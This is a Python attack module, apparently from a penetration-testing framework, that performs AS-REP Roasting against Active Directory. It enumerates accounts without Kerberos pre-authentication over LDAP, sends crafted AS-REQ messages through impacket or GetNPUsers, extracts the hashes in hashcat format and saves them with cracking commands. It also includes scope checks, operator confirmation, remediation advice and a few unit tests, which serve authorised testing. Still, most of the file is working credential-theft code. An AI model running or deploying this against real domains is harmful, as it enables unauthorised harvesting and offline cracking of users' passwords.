"""AS-REP Roasting — request AS-REP hashes for accounts without Kerberos pre-authentication.

Attack: TA0006/T1558.004
Accounts with UF_DONT_REQUIRE_PREAUTH (UAC bit 0x400000) will respond to an AS-REQ
without a valid PA-ENC-TIMESTAMP. The returned AS-REP contains an encrypted session
key (encrypted with the user's NT hash) that can be cracked offline.
"""
from __future__ import annotations

import asyncio
import os
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

# CVSS: Network-accessible, no auth needed (PR:N), high confidentiality impact
CVSS_ASREP = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
CVSS40_ASREP = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
# UAC flag: DONT_REQUIRE_PREAUTH
UAC_DONT_REQUIRE_PREAUTH = 0x400000


class AsrepRoast(BaseModule):
    """AS-REP Roasting attack module."""

    NAME        = "asrep_roast"
    DESCRIPTION = "Enumerate accounts with DONT_REQUIRE_PREAUTH; request AS-REP hashes for offline cracking"
    PHASE       = 5
    TAGS        = ["attacks", "asrep", "kerberos", "hash", "mitre-T1558.004"]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        domain = self.config.extra.get("domain", "")
        dc_ip  = self.config.extra.get("dc", self.config.target)

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        # Enumerate accounts with DONT_REQUIRE_PREAUTH via LDAP
        await self.rate_limit()
        asrep_accounts = await self._enum_asrep_accounts(domain, dc_ip)

        if not asrep_accounts:
            self.log.info("No accounts with DONT_REQUIRE_PREAUTH found")
            return self._make_result(start)

        self.log.info("%d AS-REP roastable account(s) found", len(asrep_accounts))

        confirmed = self.confirm_action(
            action=(
                f"AS-REP Roast {len(asrep_accounts)} account(s) on {domain} "
                f"({', '.join(asrep_accounts[:5])})"
                " — request TGT hashes for offline cracking"
            ),
            target=domain,
            risk=(
                "Creates Kerberos AS-REQ traffic without pre-auth. "
                "Events 4768 (Kerberos TGT request) may appear on DCs."
            ),
        )
        if not confirmed:
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        hashes = await self._roast_accounts(asrep_accounts, domain, dc_ip)

        if hashes:
            hashes_dir = Path(self.config.extra.get("results_dir", "/tmp")) / "hashes"
            hashes_dir.mkdir(parents=True, exist_ok=True)
            hash_file = hashes_dir / "asrep_hashes.txt"
            header = (
                "# AS-REP Roast hashes — hashcat mode 18200\n"
                "# hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt\n"
            )
            hash_file.write_text(header + "\n".join(hashes) + "\n", encoding="utf-8")
            self.config.extra["asrep_hashes"] = hashes

            ev = Evidence(
                request_raw=(
                    "LDAP: (&(objectClass=user)(objectCategory=person)"
                    "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
                    "(!userAccountControl:1.2.840.113556.1.4.803:=2))"
                ),
                extra={
                    "hash_count":  len(hashes),
                    "hash_file":   str(hash_file),
                    "accounts":    asrep_accounts,
                    "hashcat_cmd": f"hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt",
                },
            )
            self.new_finding(
                title=f"AS-REP Roastable Accounts — {len(hashes)} Hash(es) Obtained",
                severity=Severity.HIGH,
                description=(
                    f"{len(hashes)} AS-REP hash(es) obtained for accounts without "
                    "Kerberos pre-authentication (UF_DONT_REQUIRE_PREAUTH).\n\n"
                    f"Vulnerable accounts: {', '.join(asrep_accounts[:10])}\n\n"
                    "These hashes can be cracked offline without any domain credentials "
                    "(AS-REQ is unauthenticated). Unlike Kerberoasting, AS-REP Roasting "
                    "does NOT require prior authentication — it is exploitable anonymously."
                ),
                reproduction_steps=[
                    "# Enumerate and request without credentials:",
                    f"impacket-GetNPUsers {domain}/ -no-pass -usersfile users.txt -dc-ip {dc_ip} -format hashcat",
                    "# Or with valid creds for better enumeration:",
                    f"impacket-GetNPUsers {domain}/{self.config.extra.get('username','user')}:"
                    f"{self.config.extra.get('password','pass')} -dc-ip {dc_ip} -request",
                    "# Crack hashes:",
                    f"hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt --force",
                    "# Alternative tool:",
                    f"python3 kerbrute userenum --dc {dc_ip} --domain {domain} users.txt",
                ],
                remediation=(
                    "1. Enable Kerberos pre-authentication for ALL user accounts "
                    "   (uncheck 'Do not require Kerberos preauthentication' in AD).\n"
                    "2. If pre-auth must be disabled (legacy app requirements), use long "
                    "   random passwords (30+ chars) for those accounts.\n"
                    "3. Audit accounts regularly: "
                    "   Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} "
                    "   -Properties DoesNotRequirePreAuth\n"
                    "4. Monitor Event ID 4768 for AS-REQ without pre-auth."
                ),
                references=[
                    "MITRE TA0006/T1558.004",
                    "https://attack.mitre.org/techniques/T1558/004/",
                    "CWE-287 — Improper Authentication",
                ],
                evidence=ev,
                cvss_v31_vector=CVSS_ASREP,
                cvss_v40_vector=CVSS40_ASREP,
                mitre_attack=["TA0006/T1558.004"],
                target=dc_ip,
            )

        return self._make_result(start)

    async def _enum_asrep_accounts(self, domain: str, dc_ip: str) -> list[str]:
        """Enumerate accounts with DONT_REQUIRE_PREAUTH via LDAP."""
        # Check if user_enum already populated this
        prebuilt = self.config.extra.get("no_preauth_accounts", [])
        if prebuilt:
            return list(prebuilt)

        try:
            client = LdapClient(
                dc_ip=dc_ip, domain=domain,
                username=self.config.extra.get("username", ""),
                password=self.config.extra.get("password", ""),
                nt_hash=self.config.extra.get("hash", ""),
            )
            if not client.connect():
                return []
            try:
                # UAC bit 0x400000 = DONT_REQUIRE_PREAUTH (4194304 decimal)
                results = client.search(
                    "(&(objectClass=user)(objectCategory=person)"
                    "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
                    "(!userAccountControl:1.2.840.113556.1.4.803:=2))",
                    ["sAMAccountName", "userAccountControl", "adminCount"],
                )
                accounts = [
                    str(r.get("sAMAccountName", ""))
                    for r in results
                    if r.get("sAMAccountName")
                ]
                self.log.info("LDAP: found %d AS-REP roastable account(s)", len(accounts))
                return accounts
            finally:
                client.disconnect()
        except Exception as exc:
            self.log.debug("AS-REP LDAP enum failed: %s", exc)
            return []

    async def _roast_accounts(
        self, usernames: list[str], domain: str, dc_ip: str
    ) -> list[str]:
        # Try impacket Python API first
        hashes: list[str] = []
        try:
            hashes = await self._roast_impacket(usernames, domain, dc_ip)
            if hashes:
                return hashes
        except Exception as exc:
            self.log.debug("impacket API failed: %s", exc)

        # Fallback to GetNPUsers.py CLI
        return await self._roast_cli(usernames, domain, dc_ip)

    async def _roast_impacket(
        self, usernames: list[str], domain: str, dc_ip: str
    ) -> list[str]:
        from impacket.krb5.kerberosv5 import sendReceive, KerberosError
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal, KerberosTime
        from impacket.krb5.asn1 import AS_REQ, AS_REP, seq_set, seq_set_iter
        from pyasn1.codec.der import encoder as der_encoder, decoder as der_decoder
        from pyasn1.type.univ import noValue
        import binascii
        import datetime

        hashes: list[str] = []
        for username in usernames[:50]:
            try:
                await self.rate_limit()

                # Build AS-REQ without pre-auth (no PA-ENC-TIMESTAMP)
                client_name = Principal(
                    username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
                )
                server_name = Principal(
                    f"krbtgt/{domain}",
                    type=constants.PrincipalNameType.NT_SRV_INST.value,
                )

                as_req = AS_REQ()
                req_body = seq_set(as_req, "req-body")
                # KDC options: forwardable, renewable, proxiable
                opts = list()
                opts.append(constants.KDCOptions.forwardable.value)
                opts.append(constants.KDCOptions.renewable.value)
                opts.append(constants.KDCOptions.proxiable.value)
                req_body["kdc-options"] = constants.encodeFlags(opts)

                seq_set(req_body, "sname", server_name.components_to_asn1)
                seq_set(req_body, "cname", client_name.components_to_asn1)
                req_body["realm"] = domain.upper()

                now = datetime.datetime.now(datetime.timezone.utc)
                req_body["till"] = KerberosTime.to_asn1(
                    now + datetime.timedelta(days=1)
                )
                req_body["rtime"] = KerberosTime.to_asn1(
                    now + datetime.timedelta(days=1)
                )
                req_body["nonce"] = 12381973
                # Request RC4 (etype 23) for hashcat compatibility
                seq_set_iter(req_body, "etype", (23,))

                as_req["pvno"] = 5
                as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

                message = der_encoder.encode(as_req)

                try:
                    r = sendReceive(message, domain, dc_ip)
                except KerberosError as ke:
                    if ke.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
                        # Pre-auth required — this user is NOT roastable
                        continue
                    raise

                as_rep = der_decoder.decode(r, asn1Spec=AS_REP())[0]

                # Extract encrypted part (enc-part) from AS-REP
                enc_part = as_rep["enc-part"]
                etype = int(enc_part["etype"])
                cipher_bytes = bytes(enc_part["cipher"])

                if etype == 23:
                    # RC4-HMAC: hashcat mode 18200
                    # Format: $krb5asrep$23$user@domain:checksum$edata2
                    # checksum = first 16 bytes hex, edata2 = rest hex
                    checksum = binascii.hexlify(cipher_bytes[:16]).decode()
                    edata2 = binascii.hexlify(cipher_bytes[16:]).decode()
                    hash_str = f"$krb5asrep$23${username}@{domain.upper()}:{checksum}${edata2}"
                elif etype == 17:
                    # AES128: hashcat mode 19600
                    checksum = binascii.hexlify(cipher_bytes[-12:]).decode()
                    edata2 = binascii.hexlify(cipher_bytes[:-12]).decode()
                    hash_str = f"$krb5asrep$17${username}@{domain.upper()}:{checksum}${edata2}"
                elif etype == 18:
                    # AES256: hashcat mode 19700
                    checksum = binascii.hexlify(cipher_bytes[-12:]).decode()
                    edata2 = binascii.hexlify(cipher_bytes[:-12]).decode()
                    hash_str = f"$krb5asrep$18${username}@{domain.upper()}:{checksum}${edata2}"
                else:
                    self.log.debug("Unsupported etype %d for %s", etype, username)
                    continue

                hashes.append(hash_str)
                self.log.info("AS-REP hash obtained for: %s (etype %d)", username, etype)
            except Exception as exc:
                self.log.debug("AS-REP failed for %s: %s", username, exc)
        return hashes

    async def _roast_cli(
        self, usernames: list[str], domain: str, dc_ip: str
    ) -> list[str]:
        import shutil
        script = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
        if not script:
            return []

        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("\n".join(usernames))
            userlist_path = f.name

        try:
            cmd = [
                script, f"{domain}/", "-no-pass",
                "-usersfile", userlist_path,
                "-dc-ip", dc_ip,
                "-format", "hashcat",
            ]
            # If we have credentials, use them for better enumeration
            user = self.config.extra.get("username", "")
            pwd  = self.config.extra.get("password", "")
            if user and pwd:
                cmd = [
                    script, f"{domain}/{user}:{pwd}",
                    "-request", "-format", "hashcat",
                    "-dc-ip", dc_ip,
                ]

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
            output = stdout.decode()
            return [
                line.strip()
                for line in output.splitlines()
                if line.strip().startswith("$krb5asrep$")
            ]
        except Exception as exc:
            self.log.debug("GetNPUsers CLI failed: %s", exc)
            return []
        finally:
            try:
                os.unlink(userlist_path)
            except Exception:
                pass


class TestAsrepRoast:
    def test_cvss_vector(self) -> None:
        assert CVSS_ASREP.startswith("CVSS:3.1")
        assert "/AV:N/" in CVSS_ASREP
        assert "PR:N" in CVSS_ASREP  # No auth required

    def test_uac_flag(self) -> None:
        assert UAC_DONT_REQUIRE_PREAUTH == 0x400000
        # Verify it's bit 22
        assert UAC_DONT_REQUIRE_PREAUTH == (1 << 22)

    def test_phase(self) -> None:
        assert AsrepRoast.PHASE == 5

    def test_tags(self) -> None:
        assert "mitre-T1558.004" in AsrepRoast.TAGS
